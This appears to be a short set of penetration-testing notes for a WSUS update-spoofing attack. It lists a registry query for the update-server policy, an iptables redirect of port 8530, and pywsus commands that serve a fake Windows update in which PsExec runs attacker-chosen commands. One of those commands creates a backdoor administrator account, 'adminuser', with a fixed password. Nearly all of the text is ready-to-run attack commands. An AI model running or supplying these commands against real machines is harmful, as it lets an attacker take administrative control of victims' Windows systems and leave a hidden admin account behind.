
#If local access to computer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate

#First intercept trafic

#Redirect trafic to local host:
sudo iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530

#Start pywsus server
python3 pywsus.py -c '/accepteula /s cmd.exe /c "echo pocAug2021 > C:\\poc.txt"' -e /tools/windows/SysInternalSuite/PsExec.exe -H 180.176.33.51 -p 8530

python3 pywsus.py -c '/accepteula /s cmd.exe /c "net user adminuser Password1234! /add && net localgroup Administrators adminuser /add"' -e /tools/windows/SysInternalSuite/PsExec.exe -H 180.176.33.51 -p 8530



